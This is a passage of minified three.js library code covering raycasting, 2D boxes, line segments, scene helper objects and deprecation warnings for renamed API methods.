Fe.prototype.copy.call(this,t),this.meshPerAttribute=t.meshPerAttribute,this}}),Object.assign(Yr.prototype,{linePrecision:1,set:function(t,e){this.ray.set(t,e)},setFromCamera:function(t,e){e&&e.isPerspectiveCamera?(this.ray.origin.setFromMatrixPosition(e.matrixWorld),this.ray.direction.set(t.x,t.y,.5).unproject(e).sub(this.ray.origin).normalize(),this.camera=e):e&&e.isOrthographicCamera?(this.ray.origin.set(t.x,t.y,(e.near+e.far)/(e.near-e.far)).unproject(e),this.ray.direction.set(0,0,-1).transformDirection(e.matrixWorld),this.camera=e):console.error("THREE.Raycaster: Unsupported camera type.")},intersectObject:function(t,e,i){return Zr(t,this,i=i||[],e),i.sort($r),i},intersectObjects:function(t,e,i){if(i=i||[],!1===Array.isArray(t))return console.warn("THREE.Raycaster.intersectObjects: objects is not an Array."),i;for(var n=0,r=t.length;n<r;n++)Zr(t[n],this,i,e);return i.sort($r),i}}),Object.assign(Jr.prototype,{set:function(t,e,i){return this.radius=t,this.phi=e,this.theta=i,this},clone:function(){return(new this.constructor).copy(this)},copy:function(t){return this.radius=t.radius,this.phi=t.phi,this.theta=t.theta,this},makeSafe:function(){return this.phi=Math.max(1e-6,Math.min(Math.PI-1e-6,this.phi)),this},setFromVector3:function(t){return this.setFromCartesianCoords(t.x,t.y,t.z)},setFromCartesianCoords:function(t,e,i){return this.radius=Math.sqrt(t*t+e*e+i*i),0===this.radius?this.phi=this.theta=0:(this.theta=Math.atan2(t,i),this.phi=Math.acos(Ca.clamp(e/this.radius,-1,1))),this}}),Object.assign(Kr.prototype,{set:function(t,e,i){return this.radius=t,this.theta=e,this.y=i,this},clone:function(){return(new this.constructor).copy(this)},copy:function(t){return this.radius=t.radius,this.theta=t.theta,this.y=t.y,this},setFromVector3:function(t){return this.setFromCartesianCoords(t.x,t.y,t.z)},setFromCartesianCoords:function(t,e,i){return this.radius=Math.sqrt(t*t+i*i),this.theta=Math.atan2(t,i),this.y=e,this}});var Xl=new i;Object.assign(Qr.prototype,{set:function(t,e){return this.min.copy(t),this.max.copy(e),this},setFromPoints:function(t){this.makeEmpty();for(var e=0,i=t.length;e<i;e++)this.expandByPoint(t[e]);return this},setFromCenterAndSize:function(t,e){return e=Xl.copy(e).multiplyScalar(.5),this.min.copy(t).sub(e),this.max.copy(t).add(e),this},clone:function(){return(new this.constructor).copy(this)},copy:function(t){return this.min.copy(t.min),this.max.copy(t.max),this},makeEmpty:function(){return this.min.x=this.min.y=1/0,this.max.x=this.max.y=-1/0,this},isEmpty:function(){return this.max.x<this.min.x||this.max.y<this.min.y},getCenter:function(t){return void 0===t&&(console.warn("THREE.Box2: .getCenter() target is now required"),t=new i),this.isEmpty()?t.set(0,0):t.addVectors(this.min,this.max).multiplyScalar(.5)},getSize:function(t){return void 0===t&&(console.warn("THREE.Box2: .getSize() target is now required"),t=new i),this.isEmpty()?t.set(0,0):t.subVectors(this.max,this.min)},expandByPoint:function(t){return this.min.min(t),this.max.max(t),this},expandByVector:function(t){return this.min.sub(t),this.max.add(t),this},expandByScalar:function(t){return this.min.addScalar(-t),this.max.addScalar(t),this},containsPoint:function(t){return!(t.x<this.min.x||t.x>this.max.x||t.y<this.min.y||t.y>this.max.y)},containsBox:function(t){return this.min.x<=t.min.x&&t.max.x<=this.max.x&&this.min.y<=t.min.y&&t.max.y<=this.max.y},getParameter:function(t,e){return void 0===e&&(console.warn("THREE.Box2: .getParameter() target is now required"),e=new i),e.set((t.x-this.min.x)/(this.max.x-this.min.x),(t.y-this.min.y)/(this.max.y-this.min.y))},intersectsBox:function(t){return!(t.max.x<this.min.x||t.min.x>this.max.x||t.max.y<this.min.y||t.min.y>this.max.y)},clampPoint:function(t,e){return void 0===e&&(console.warn("THREE.Box2: .clampPoint() target is now required"),e=new i),e.copy(t).clamp(this.min,this.max)},distanceToPoint:function(t){return Xl.copy(t).clamp(this.min,this.max).sub(t).length()},intersect:function(t){return this.min.max(t.min),this.max.min(t.max),this},union:function(t){return this.min.min(t.min),this.max.max(t.max),this},translate:function(t){return this.min.add(t),this.max.add(t),this},equals:function(t){return t.min.equals(this.min)&&t.max.equals(this.max)}});var Yl=new r,$l=new r;Object.assign(ta.prototype,{set:function(t,e){return this.start.copy(t),this.end.copy(e),this},clone:function(){return(new this.constructor).copy(this)},copy:function(t){return this.start.copy(t.start),this.end.copy(t.end),this},getCenter:function(t){return void 0===t&&(console.warn("THREE.Line3: .getCenter() target is now required"),t=new r),t.addVectors(this.start,this.end).multiplyScalar(.5)},delta:function(t){return void 0===t&&(console.warn("THREE.Line3: .delta() target is now required"),t=new r),t.subVectors(this.end,this.start)},distanceSq:function(){return this.start.distanceToSquared(this.end)},distance:function(){return this.start.distanceTo(this.end)},at:function(t,e){return void 0===e&&(console.warn("THREE.Line3: .at() target is now required"),e=new r),this.delta(e).multiplyScalar(t).add(this.start)},closestPointToPointParameter:function(t,e){return Yl.subVectors(t,this.start),$l.subVectors(this.end,this.start),t=$l.dot($l),t=$l.dot(Yl)/t,e&&(t=Ca.clamp(t,0,1)),t},closestPointToPoint:function(t,e,i){return t=this.closestPointToPointParameter(t,e),void 0===i&&(console.warn("THREE.Line3: .closestPointToPoint() target is now required"),i=new r),this.delta(i).multiplyScalar(t).add(this.start)},applyMatrix4:function(t){return this.start.applyMatrix4(t),this.end.applyMatrix4(t),this},equals:function(t){return t.start.equals(this.start)&&t.end.equals(this.end)}}),ea.prototype=Object.create(p.prototype),ea.prototype.constructor=ea,ea.prototype.isImmediateRenderObject=!0;var Zl=new r,Jl=new r,Kl=new a,Ql=["a","b","c"];ia.prototype=Object.create(Ze.prototype),ia.prototype.constructor=ia,ia.prototype.update=function(){this.object.updateMatrixWorld(!0),Kl.getNormalMatrix(this.object.matrixWorld);var t=this.object.matrixWorld,e=this.geometry.attributes.position,i=this.object.geometry;if(i&&i.isGeometry)for(var n=i.vertices,r=i.faces,a=i=0,o=r.length;a<o;a++)for(var s=r[a],l=0,c=s.vertexNormals.length;l<c;l++){var h=s.vertexNormals[l];Zl.copy(n[s[Ql[l]]]).applyMatrix4(t),Jl.copy(h).applyMatrix3(Kl).normalize().multiplyScalar(this.size).add(Zl),e.setXYZ(i,Zl.x,Zl.y,Zl.z),i+=1,e.setXYZ(i,Jl.x,Jl.y,Jl.z),i+=1}else if(i&&i.isBufferGeometry)for(n=i.attributes.position,r=i.attributes.normal,l=i=0,c=n.count;l<c;l++)Zl.set(n.getX(l),n.getY(l),n.getZ(l)).applyMatrix4(t),Jl.set(r.getX(l),r.getY(l),r.getZ(l)),Jl.applyMatrix3(Kl).normalize().multiplyScalar(this.size).add(Zl),e.setXYZ(i,Zl.x,Zl.y,Zl.z),i+=1,e.setXYZ(i,Jl.x,Jl.y,Jl.z),i+=1;e.needsUpdate=!0};var tc=new r;na.prototype=Object.create(p.prototype),na.prototype.constructor=na,na.prototype.dispose=function(){this.cone.geometry.dispose(),this.cone.material.dispose()},na.prototype.update=function(){this.light.updateMatrixWorld();var t=this.light.distance?this.light.distance:1e3,e=t*Math.tan(this.light.angle);this.cone.scale.set(e,e,t),tc.setFromMatrixPosition(this.light.target.matrixWorld),this.cone.lookAt(tc),void 0!==this.color?this.cone.material.color.set(this.color):this.cone.material.color.copy(this.light.color)};var ec=new r,ic=new h,nc=new h;aa.prototype=Object.create(Ze.prototype),aa.prototype.constructor=aa,aa.prototype.updateMatrixWorld=function(t){var e=this.bones,i=this.geometry,n=i.getAttribute("position");nc.getInverse(this.root.matrixWorld);for(var r=0,a=0;r<e.length;r++){var o=e[r];o.parent&&o.parent.isBone&&(ic.multiplyMatrices(nc,o.matrixWorld),ec.setFromMatrixPosition(ic),n.setXYZ(a,ec.x,ec.y,ec.z),ic.multiplyMatrices(nc,o.parent.matrixWorld),ec.setFromMatrixPosition(ic),n.setXYZ(a+1,ec.x,ec.y,ec.z),a+=2)}i.getAttribute("position").needsUpdate=!0,p.prototype.updateMatrixWorld.call(this,t)},oa.prototype=Object.create(H.prototype),oa.prototype.constructor=oa,oa.prototype.dispose=function(){this.geometry.dispose(),this.material.dispose()},oa.prototype.update=function(){void 0!==this.color?this.material.color.set(this.color):this.material.color.copy(this.light.color)},sa.prototype=Object.create($e.prototype),sa.prototype.constructor=sa,sa.prototype.update=function(){if(this.scale.set(.5*this.light.width,.5*this.light.height,1),void 0!==this.color)this.material.color.set(this.color),this.children[0].material.color.set(this.color);else{this.material.color.copy(this.light.color).multiplyScalar(this.light.intensity);var t=this.material.color,e=Math.max(t.r,t.g,t.b);1<e&&t.multiplyScalar(1/e),this.children[0].material.color.copy(this.material.color)}},sa.prototype.dispose=function(){this.geometry.dispose(),this.material.dispose(),this.children[0].geometry.dispose(),this.children[0].material.dispose()};var rc=new r,ac=new b,oc=new b;la.prototype=Object.create(p.prototype),la.prototype.constructor=la,la.prototype.dispose=function(){this.children[0].geometry.dispose(),this.children[0].material.dispose()},la.prototype.update=function(){var t=this.children[0];if(void 0!==this.color)this.material.color.set(this.color);else{var e=t.geometry.getAttribute("color");ac.copy(this.light.color),oc.copy(this.light.groundColor);for(var i=0,n=e.count;i<n;i++){var r=i<n/2?ac:oc;e.setXYZ(i,r.r,r.g,r.b)}e.needsUpdate=!0}t.lookAt(rc.setFromMatrixPosition(this.light.matrixWorld).negate())},ca.prototype=Object.create(H.prototype),ca.prototype.constructor=ca,ca.prototype.dispose=function(){this.geometry.dispose(),this.material.dispose()},ca.prototype.onBeforeRender=function(){this.position.copy(this.lightProbe.position),this.scale.set(1,1,1).multiplyScalar(this.size),this.material.uniforms.intensity.value=this.lightProbe.intensity},ha.prototype=Object.assign(Object.create(Ze.prototype),{constructor:ha,copy:function(t){return Ze.prototype.copy.call(this,t),this.geometry.copy(t.geometry),this.material.copy(t.material),this},clone:function(){return(new this.constructor).copy(this)}}),ua.prototype=Object.create(Ze.prototype),ua.prototype.constructor=ua,da.prototype=Object.create($e.prototype),da.prototype.constructor=da,da.prototype.update=function(){function t(t,n,a,o){for(a=(n-t)/a,p.setXYZ(h,0,0,0),u++,e=t;e<n;e+=a)i=h+u,p.setXYZ(i,Math.sin(e)*r,0,Math.cos(e)*r),p.setXYZ(i+1,Math.sin(Math.min(e+a,n))*r,0,Math.cos(Math.min(e+a,n))*r),p.setXYZ(i+2,0,0,0),u+=3;d.addGroup(h,u,o),h+=u,u=0}var e,i,n=this.audio,r=this.range,a=this.divisionsInnerAngle,o=this.divisionsOuterAngle,s=Ca.degToRad(n.panner.coneInnerAngle),l=s/2,c=(n=Ca.degToRad(n.panner.coneOuterAngle))/2,h=0,u=0,d=this.geometry,p=d.attributes.position;d.clearGroups(),t(-c,-l,o,0),t(-l,l,a,1),t(l,c,o,0),p.needsUpdate=!0,s===n&&(this.material[0].visible=!1)},da.prototype.dispose=function(){this.geometry.dispose(),this.material[0].dispose(),this.material[1].dispose()};var sc=new r,lc=new r,cc=new a;pa.prototype=Object.create(Ze.prototype),pa.prototype.constructor=pa,pa.prototype.update=function(){this.object.updateMatrixWorld(!0),cc.getNormalMatrix(this.object.matrixWorld);for(var t=this.object.matrixWorld,e=this.geometry.attributes.position,i=this.object.geometry,n=i.vertices,r=0,a=0,o=(i=i.faces).length;a<o;a++){var s=i[a],l=s.normal;sc.copy(n[s.a]).add(n[s.b]).add(n[s.c]).divideScalar(3).applyMatrix4(t),lc.copy(l).applyMatrix3(cc).normalize().multiplyScalar(this.size).add(sc),e.setXYZ(r,sc.x,sc.y,sc.z),r+=1,e.setXYZ(r,lc.x,lc.y,lc.z),r+=1}e.needsUpdate=!0};var hc=new r,uc=new r,dc=new r;fa.prototype=Object.create(p.prototype),fa.prototype.constructor=fa,fa.prototype.dispose=function(){this.lightPlane.geometry.dispose(),this.lightPlane.material.dispose(),this.targetLine.geometry.dispose(),this.targetLine.material.dispose()},fa.prototype.update=function(){hc.setFromMatrixPosition(this.light.matrixWorld),uc.setFromMatrixPosition(this.light.target.matrixWorld),dc.subVectors(uc,hc),this.lightPlane.lookAt(uc),void 0!==this.color?(this.lightPlane.material.color.set(this.color),this.targetLine.material.color.set(this.color)):(this.lightPlane.material.color.copy(this.light.color),this.targetLine.material.color.copy(this.light.color)),this.targetLine.lookAt(uc),this.targetLine.scale.z=dc.length()};var pc=new r,fc=new $;ma.prototype=Object.create(Ze.prototype),ma.prototype.constructor=ma,ma.prototype.update=function(){var t=this.geometry,e=this.pointMap;fc.projectionMatrixInverse.copy(this.camera.projectionMatrixInverse),ga("c",e,t,fc,0,0,-1),ga("t",e,t,fc,0,0,1),ga("n1",e,t,fc,-1,-1,-1),ga("n2",e,t,fc,1,-1,-1),ga("n3",e,t,fc,-1,1,-1),ga("n4",e,t,fc,1,1,-1),ga("f1",e,t,fc,-1,-1,1),ga("f2",e,t,fc,1,-1,1),ga("f3",e,t,fc,-1,1,1),ga("f4",e,t,fc,1,1,1),ga("u1",e,t,fc,.7,1.1,-1),ga("u2",e,t,fc,-.7,1.1,-1),ga("u3",e,t,fc,0,2,-1),ga("cf1",e,t,fc,-1,0,1),ga("cf2",e,t,fc,1,0,1),ga("cf3",e,t,fc,0,-1,1),ga("cf4",e,t,fc,0,1,1),ga("cn1",e,t,fc,-1,0,-1),ga("cn2",e,t,fc,1,0,-1),ga("cn3",e,t,fc,0,-1,-1),ga("cn4",e,t,fc,0,1,-1),t.getAttribute("position").needsUpdate=!0};var mc=new m;va.prototype=Object.create(Ze.prototype),va.prototype.constructor=va,va.prototype.update=function(t){if(void 0!==t&&console.warn("THREE.BoxHelper: .update() has no longer arguments."),void 0!==this.object&&mc.setFromObject(this.object),!mc.isEmpty()){t=mc.min;var e=mc.max,i=this.geometry.attributes.position,n=i.array;n[0]=e.x,n[1]=e.y,n[2]=e.z,n[3]=t.x,n[4]=e.y,n[5]=e.z,n[6]=t.x,n[7]=t.y,n[8]=e.z,n[9]=e.x,n[10]=t.y,n[11]=e.z,n[12]=e.x,n[13]=e.y,n[14]=t.z,n[15]=t.x,n[16]=e.y,n[17]=t.z,n[18]=t.x,n[19]=t.y,n[20]=t.z,n[21]=e.x,n[22]=t.y,n[23]=t.z,i.needsUpdate=!0,this.geometry.computeBoundingSphere()}},va.prototype.setFromObject=function(t){return this.object=t,this.update(),this},va.prototype.copy=function(t){return Ze.prototype.copy.call(this,t),this.object=t.object,this},va.prototype.clone=function(){return(new this.constructor).copy(this)},ya.prototype=Object.create(Ze.prototype),ya.prototype.constructor=ya,ya.prototype.updateMatrixWorld=function(t){var e=this.box;e.isEmpty()||(e.getCenter(this.position),e.getSize(this.scale),this.scale.multiplyScalar(.5),p.prototype.updateMatrixWorld.call(this,t))},xa.prototype=Object.create($e.prototype),xa.prototype.constructor=xa,xa.prototype.updateMatrixWorld=function(t){var e=-this.plane.constant;1e-8>Math.abs(e)&&(e=1e-8),this.scale.set(.5*this.size,.5*this.size,e),this.children[0].material.side=0>e?1:0,this.lookAt(this.plane.normal),p.prototype.updateMatrixWorld.call(this,t)};var gc,vc,yc=new r;ba.prototype=Object.create(p.prototype),ba.prototype.constructor=ba,ba.prototype.setDirection=function(t){.99999<t.y?this.quaternion.set(0,0,0,1):-.99999>t.y?this.quaternion.set(1,0,0,0):(yc.set(t.z,0,-t.x).normalize(),this.quaternion.setFromAxisAngle(yc,Math.acos(t.y)))},ba.prototype.setLength=function(t,e,i){void 0===e&&(e=.2*t),void 0===i&&(i=.2*e),this.line.scale.set(1,Math.max(0,t-e),1),this.line.updateMatrix(),this.cone.scale.set(i,e,i),this.cone.position.y=t,this.cone.updateMatrix()},ba.prototype.setColor=function(t){this.line.material.color.set(t),this.cone.material.color.set(t)},ba.prototype.copy=function(t){return p.prototype.copy.call(this,t,!1),this.line.copy(t.line),this.cone.copy(t.cone),this},ba.prototype.clone=function(){return(new this.constructor).copy(this)},wa.prototype=Object.create(Ze.prototype),wa.prototype.constructor=wa,Vn.create=function(t,e){return console.log("THREE.Curve.create() has been deprecated"),t.prototype=Object.create(Vn.prototype),t.prototype.constructor=t,t.prototype.getPoint=e,t},Object.assign(ar.prototype,{createPointsGeometry:function(t){return console.warn("THREE.CurvePath: .createPointsGeometry() has been removed. Use new THREE.Geometry().setFromPoints( points ) instead."),t=this.getPoints(t),this.createGeometry(t)},createSpacedPointsGeometry:function(t){return console.warn("THREE.CurvePath: .createSpacedPointsGeometry() has been removed. Use new THREE.Geometry().setFromPoints( points ) instead."),t=this.getSpacedPoints(t),this.createGeometry(t)},createGeometry:function(t){console.warn("THREE.CurvePath: .createGeometry() has been removed. Use new THREE.Geometry().setFromPoints( points ) instead.");for(var e=new U,i=0,n=t.length;i<n;i++){var a=t[i];e.vertices.push(new r(a.x,a.y,a.z||0))}return e}}),Object.assign(or.prototype,{fromPoints:function(t){console.warn("THREE.Path: .fromPoints() has been renamed to .setFromPoints()."),this.setFromPoints(t)}}),_a.prototype=Object.create(Yn.prototype),Ma.prototype=Object.create(Yn.prototype),Sa.prototype=Object.create(Yn.prototype),Object.assign(Sa.prototype,{initFromArray:function(){console.error("THREE.Spline: .initFromArray() has been removed.")},getControlPointsArray:function(){console.error("THREE.Spline: .getControlPointsArray() has been removed.")},reparametrizeByArcLength:function(){console.error("THREE.Spline: .reparametrizeByArcLength() has been removed.")}}),ha.prototype.setColors=function(){console.error("THREE.GridHelper: setColors() has been deprecated, pass them in the constructor instead.")},aa.prototype.update=function(){console.error("THREE.SkeletonHelper: update() no longer needs to be called.")},Object.assign(Nn.prototype,{extractUrlBase:function(t){return console.warn("THREE.Loader: .extractUrlBase() has been deprecated. Use THREE.LoaderUtils.extractUrlBase() instead."),_l.extractUrlBase(t)}}),Object.assign(Sr.prototype,{setTexturePath:function(t){return console.warn("THREE.ObjectLoader: .setTexturePath() has been renamed to .setResourcePath()."),this.setResourcePath(t)}}),Object.assign(Qr.prototype,{center:function(t){return console.warn("THREE.Box2: .center() has been renamed to .getCenter()."),this.getCenter(t)},empty:function(){return console.warn("THREE.Box2: .empty() has been renamed to .isEmpty()."),this.isEmpty()},isIntersectionBox:function(t){return console.warn("THREE.Box2: .isIntersectionBox() has been renamed to .intersectsBox()."),this.intersectsBox(t)},size:function(t){return console.warn("THREE.Box2: .size() has been renamed to .getSize()."),this.getSize(t)}}),Object.assign(m.prototype,{center:function(t){return console.warn("THREE.Box3: .center() has been renamed to .getCenter()."),this.getCenter(t)},empty:function(){return console.warn("THREE.Box3: .empty() has been renamed to .isEmpty()."),this.isEmpty()},isIntersectionBox:function(t){return console.warn("THREE.Box3: .isIntersectionBox() has been renamed to .intersectsBox()."),this.intersectsBox(t)},isIntersectionSphere:function(t){return console.warn("THREE.Box3: .isIntersectionSphere() has been renamed to .intersectsSphere()."),this.intersectsSphere(t)},size:function(t){return console.warn("THREE.Box3: .size() has been renamed to .getSize()."),this.getSize(t)}}),ta.prototype.center=function(t){return console.warn("THREE.Line3: .center() has been renamed to .getCenter()."),this.getCenter(t)},Object.assign(Ca,{random16:function(){return console.warn("THREE.Math: .random16() has been deprecated. Use Math.random() instead."),Math.random()},nearestPowerOfTwo:function(t){return console.warn("THREE.Math: .nearestPowerOfTwo() has been renamed to .floorPowerOfTwo()."),Ca.floorPowerOfTwo(t)},nextPowerOfTwo:function(t){return console.warn("THREE.Math: .nextPowerOfTwo() has been renamed to .ceilPowerOfTwo()."),Ca.ceilPowerOfTwo(t)}}),Object.assign(a.prototype,{flattenToArrayOffset:function(t,e){return console.warn("THREE.Matrix3: .flattenToArrayOffset() has been deprecated. Use .toArray() instead."),this.toArray(t,e)},multiplyVector3:function(t){return console.warn("THREE.Matrix3: .multiplyVector3() has been removed. Use vector.applyMatrix3( matrix ) instead."),t.applyMatrix3(this)},multiplyVector3Array:function(){console.error("THREE.Matrix3: .multiplyVector3Array() has been removed.")},applyToBuffer:function(t){return console.warn("THREE.Matrix3: .applyToBuffer() has been removed. Use matrix.applyToBufferAttribute( attribute ) instead."),this.applyToBufferAttribute(t)},applyToVector3Array:function(){console.error("THREE.Matrix3: .applyToVector3Array() has been removed.")}}),Object.assign(h.prototype,{extractPosition:function(t){return console.warn("THREE.Matrix4: .extractPosition() has been renamed to .copyPosition()."),this.copyPosition(t)},flattenToArrayOffset:function(t,e){return console.warn("THREE.Matrix4: .flattenToArrayOffset() has been deprecated. Use .toArray() instead."),this.toArray(t,e)},getPosition:function(){return console.warn("THREE.Matrix4: .getPosition() has been removed. Use Vector3.setFromMatrixPosition( matrix ) instead."),(new r).setFromMatrixColumn(this,3)},setRotationFromQuaternion:function(t){return console.warn("THREE.Matrix4: .setRotationFromQuaternion() has been renamed to .makeRotationFromQuaternion()."),this.makeRotationFromQuaternion(t)},multiplyToArray:function(){console.warn("THREE.Matrix4: .multiplyToArray() has been removed.")},multiplyVector3:function(t){return console.warn("THREE.Matrix4: .multiplyVector3() has been removed. Use vector.applyMatrix4( matrix ) instead."),t.applyMatrix4(this)},multiplyVector4:function(t){return console.warn("THREE.Matrix4: .multiplyVector4() has been removed. Use vector.applyMatrix4( matrix ) instead."),t.applyMatrix4(this)},multiplyVector3Array:function(){console.error("THREE.Matrix4: .multiplyVector3Array() has been removed.")},rotateAxis:function(t){console.warn("THREE.Matrix4: .rotateAxis() has been removed. Use Vector3.transformDirection( matrix ) instead."),t.transformDirection(this)},crossVector:function(t){return console.warn("THREE.Matrix4: .crossVector() has been removed. Use vector.applyMatrix4( matrix ) instead."),t.applyMatrix4(this)},translate:function(){console.error("THREE.Matrix4: .translate() has been removed.")},rotateX:function(){console.error("THREE.Matrix4: .rotateX() has been removed.")},rotateY:function(){console.error("THREE.Matrix4: .rotateY() has been removed.")},rotateZ:function(){console.error("THREE.Matrix4: .rotateZ() has been removed.")},rotateByAxis:function(){console.error("THREE.Matrix4: .rotateByAxis() has been removed.")},applyToBuffer:function(t){return console.warn("THREE.Matrix4: .applyToBuffer() has been removed. Use matrix.applyToBufferAttribute( attribute ) instead."),this.applyToBufferAttribute(t)},applyToVector3Array:function(){console.error("THREE.Matrix4: .applyToVector3Array() has been removed.")},makeFrustum:function(t,e,i,n,r,a){return console.warn("THREE.Matrix4: .makeFrustum() has been removed. Use .makePerspective( left, right, top, bottom, near, far ) instead."),this.makePerspective(t,e,n,i,r,a)}}),tt.prototype.isIntersectionLine=function(t){return console.warn("THREE.Plane: .isIntersectionLine() has been renamed to .intersectsLine()."),this.intersectsLine(t)},n.prototype.multiplyVector3=function(t){return console.warn("THREE.Quaternion: .multiplyVector3() has been removed. Use is now vector.applyQuaternion( quaternion ) instead."),t.applyQuaternion(this)},Object.assign(y.prototype,{isIntersectionBox:function(t){return console.warn("THREE.Ray: .isIntersectionBox() has been renamed to .intersectsBox()."),this.intersectsBox(t)},isIntersectionPlane:function(t){return console.warn("THREE.Ray: .isIntersectionPlane() has been renamed to .intersectsPlane()."),this.intersectsPlane(t)},isIntersectionSphere:function(t){return console.warn("THREE.Ray: .isIntersectionSphere() has been renamed to .intersectsSphere()."),this.intersectsSphere(t)}}),Object.assign(x.prototype,{area:function(){return console.warn("THREE.Triangle: .area() has been renamed to .getArea()."),this.getArea()},barycoordFromPoint:function(t,e){return console.warn("THREE.Triangle: .barycoordFromPoint() has been renamed to .getBarycoord()."),this.getBarycoord(t,e)},midpoint:function(t){return console.warn("THREE.Triangle: .midpoint() has been renamed to .getMidpoint()."),this.getMidpoint(t)},normal:function(t){return console.warn("THREE.Triangle: .normal() has been renamed to .getNormal()."),this.getNormal(t)},plane:function(t){return console.warn("THREE.Triangle: .plane() has been renamed to .getPlane()."),this.getPlane(t)}}),Object.assign(x,{barycoordFromPoint:function(t,e,i,n,r){return console.warn("THREE.Triangle: .barycoordFromPoint() has been renamed to .getBarycoord()."),x.getBarycoord(t,e,i,n,r)},normal:function(t,e,i,n){return console.warn("THREE.Triangle: .normal() has been renamed to .getNormal()."),x.getNormal(t,e,i,n)}}),Object.assign(sr.prototype,{extractAllPoints:function(t){return console.warn("THREE.Shape: .extractAllPoints() has been removed. Use .extractPoints() instead."),this.extractPoints(t)},extrude:function(t){return console.warn("THREE.Shape: .extrude() has been removed. Use ExtrudeGeometry() instead."),new Ui(this,t)},makeGeometry:function(t){return console.warn("THREE.Shape: .makeGeometry() has been removed. Use ShapeGeometry() instead."),new tn(this,t)}}),Object.assign(i.prototype,{fromAttribute:function(t,e,i){return console.warn("THREE.Vector2: .fromAttribute() has been renamed to .fromBufferAttribute()."),this.fromBufferAttribute(t,e,i)},distanceToManhattan:function(t){return console.warn("THREE.Vector2: .distanceToManhattan() has been renamed to .manhattanDistanceTo()."),this.manhattanDistanceTo(t)},lengthManhattan:function(){return console.warn("THREE.Vector2: .lengthManhattan() has been renamed to .manhattanLength()."),this.manhattanLength()}}),Object.assign(r.prototype,{setEulerFromRotationMatrix:function(){console.error("THREE.Vector3: .setEulerFromRotationMatrix() has been removed. Use Euler.setFromRotationMatrix() instead.")},setEulerFromQuaternion:function(){console.error("THREE.Vector3: .setEulerFromQuaternion() has been removed. Use Euler.setFromQuaternion() instead.")},getPositionFromMatrix:function(t){return console.warn("THREE.Vector3: .getPositionFromMatrix() has been renamed to .setFromMatrixPosition()."),this.setFromMatrixPosition(t)},getScaleFromMatrix:function(t){return console.warn("THREE.Vector3: .getScaleFromMatrix() has been renamed to .setFromMatrixScale()."),this.setFromMatrixScale(t)},getColumnFromMatrix:function(t,e){return console.warn("THREE.Vector3: .getColumnFromMatrix() has been renamed to .setFromMatrixColumn()."),this.setFromMatrixColumn(e,t)},applyProjection:function(t){return console.warn("THREE.Vector3: .applyProjection() has been removed. Use .applyMatrix4( m ) instead."),this.applyMatrix4(t)},fromAttribute:function(t,e,i){return console.warn("THREE.Vector3: .fromAttribute() has been renamed to .fromBufferAttribute()."),this.fromBufferAttribute(t,e,i)},distanceToManhattan:function(t){return console.warn("THREE.Vector3: .distanceToManhattan() has been renamed to .manhattanDistanceTo()."),this.manhattanDistanceTo(t)},lengthManhattan:function(){return console.warn("THREE.Vector3: .lengthManhattan() has been renamed to .manhattanLength()."),this.manhattanLength()}}),Object.assign(s.prototype,{fromAttribute:function(t,e,i){return console.warn("THREE.Vector4: .fromAttribute() has been renamed to .fromBufferAttribute()."),this.fromBufferAttribute(t,e,i)},lengthManhattan:function(){return console.warn("THREE.Vector4: .lengthManhattan() has been renamed to .manhattanLength()."),this.manhattanLength()}}),Object.assign(U.prototype,{computeTangents:function(){console.error("THREE.Geometry: .computeTangents() has been removed.")},computeLineDistances:function(){console.error("THREE.Geometry: .computeLineDistances() has been removed. Use THREE.Line.computeLineDistances() instead.")}}),Object.assign(p.prototype,{getChildByName:function(t){return console.warn("THREE.Object3D: .getChildByName() has been renamed to .getObjectByName()."),this.getObjectByName(t)},renderDepth:function(){console.warn("THREE.Object3D: .renderDepth has been removed. Use .renderOrder, instead.")},translate:function(t,e){return console.warn("THREE.Object3D: .translate() has been removed. Use .translateOnAxis( axis, distance ) instead."),this.translateOnAxis(e,t)},getWorldRotation:function(){console.error("THREE.Object3D: .getWorldRotation() has been removed. Use THREE.Object3D.getWorldQuaternion( target ) instead.")}}),Object.defineProperties(p.prototype,{eulerOrder:{get:function(){return console.warn("THREE.Object3D: .eulerOrder is now .rotation.order."),this.rotation.order},set:function(t){console.warn("THREE.Object3D: .eulerOrder is now .rotation.order."),this.rotation.order=t}},useQuaternion:{get:function(){console.warn("THREE.Object3D: .useQuaternion has been removed. The library now uses quaternions by default.")},set:function(){console.warn("THREE.Object3D: .useQuaternion has been removed. The library now uses quaternions by default.")}}}),Object.defineProperties(Ve.prototype,{objects:{get:function(){return console.warn("THREE.LOD: .objects has been renamed to .levels."),this.levels}}}),Object.defineProperty(qe.prototype,"useVertexTexture",{get:function(){console.warn("THREE.Skeleton: useVertexTexture has been removed.")},set:function(){console.warn("THREE.Skeleton: useVertexTexture has been removed.")}}),We.prototype.initBones=function(){console.error("THREE.SkinnedMesh: initBones() has been removed.")},Object.defineProperty(Vn.prototype,"__arcLengthDivisions",{get:function(){return console.warn("THREE.Curve: .__arcLengthDivisions is now .arcLengthDivisions."),this.arcLengthDivisions},set:function(t){console.warn("THREE.Curve: .__arcLengthDivisions is now .arcLengthDivisions."),this.arcLengthDivisions=t}}),Z.prototype.setLens=function(t,e){console.warn("THREE.PerspectiveCamera.setLens is deprecated. Use .setFocalLength and .filmGauge for a photographic setup."),void 0!==e&&(this.filmGauge=e),this.setFocalLength(t)},Object.defineProperties(lr.prototype,{onlyShadow:{set:function(){console.warn("THREE.Light: .onlyShadow has been removed.")}},shadowCameraFov:{set:function(t){console.warn("THREE.Light: .shadowCameraFov is now .shadow.camera.fov."),this.shadow.camera.fov=t}},shadowCameraLeft:{set:function(t){console.warn("THREE.Light: .shadowCameraLeft is now .shadow.camera.left."),this.shadow.camera.left=t}},shadowCameraRight:{set:function(t){console.warn("THREE.Light: .shadowCameraRight is now .shadow.camera.right."),this.shadow.camera.right=t}},shadowCameraTop:{set:function(t){console.warn("THREE.Light: .shadowCameraTop is now .shadow.camera.top."),this.shadow.camera.top=t}},shadowCameraBottom:{set:function(t){console.warn("THREE.Light: .shadowCameraBottom is now .shadow.camera.bottom."),this.shadow.camera.bottom=t}},shadowCameraNear:{set:function(t){console.warn("THREE.Light: .shadowCameraNear is now .shadow.camera.near."),this.shadow.camera.near=t}},shadowCameraFar:{set:function(t){console.warn("THREE.Light: .shadowCameraFar is now .shadow.camera.far."),this.shadow.camera.far=t}},shadowCameraVisible:{set:function(){console.warn("THREE.Light: .shadowCameraVisible has been removed. Use new THREE.CameraHelper( light.shadow.camera ) instead.")}},shadowBias:{set:function(t){console.warn("THREE.Light: .shadowBias is now .shadow.bias."),this.shadow.bias=t}},shadowDarkness:{set:function(){console.warn("THREE.Light: .shadowDarkness has been 